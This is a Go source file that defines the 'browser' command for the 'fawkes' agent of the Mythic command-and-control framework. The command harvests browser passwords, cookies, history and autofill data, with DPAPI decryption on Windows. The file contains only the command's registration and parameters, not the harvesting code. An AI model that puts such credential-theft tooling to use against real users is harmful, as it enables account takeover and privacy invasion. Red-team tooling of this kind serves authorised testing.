package agentfunctions

import (
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "browser",
		Description:         "Harvest browser data from Chromium-based browsers (Chrome, Edge, Chromium) and Firefox. Windows supports all actions including credential/cookie decryption via DPAPI. macOS/Linux support history, autofill, bookmarks, and Firefox cookies. (T1555.003, T1217)",
		HelpString:          "browser [-action <passwords|cookies|history|autofill|bookmarks>] [-browser <all|chrome|edge|chromium|firefox>]",
		Version:             4,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1555.003", "T1217"},
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"passwords", "cookies", "history", "autofill", "bookmarks"},
				Description:      "What to harvest: passwords (Windows Chromium only — DPAPI), cookies (Windows Chromium DPAPI; Firefox plaintext on all platforms), history (browsing URLs), autofill (form data), or bookmarks (saved URLs).",
				DefaultValue:     "history",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "browser",
				ModalDisplayName: "Browser",
				CLIName:          "browser",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"all", "chrome", "edge", "chromium", "firefox"},
				Description:      "Which browser to target. 'all' checks Chrome, Edge, Chromium, and Firefox. 'firefox' targets Firefox (places.sqlite for history/bookmarks, formhistory.sqlite for autofill, cookies.sqlite for cookies).",
				DefaultValue:     "all",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		AssociatedBrowserScript: nil,
		TaskFunctionOPSECPre:    nil,
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			browser, _ := taskData.Args.GetStringArg("browser")
			if browser == "" {
				browser = "all"
			}
			action, _ := taskData.Args.GetStringArg("action")
			if action == "" {
				action = "history"
			}
			display := fmt.Sprintf("%s %s", action, browser)
			response.DisplayParams = &display
			createArtifact(taskData.Task.ID, "File Read", fmt.Sprintf("Browser %s database access — %s", action, browser))
			return response
		},
		TaskFunctionProcessResponse: nil,
	})
}
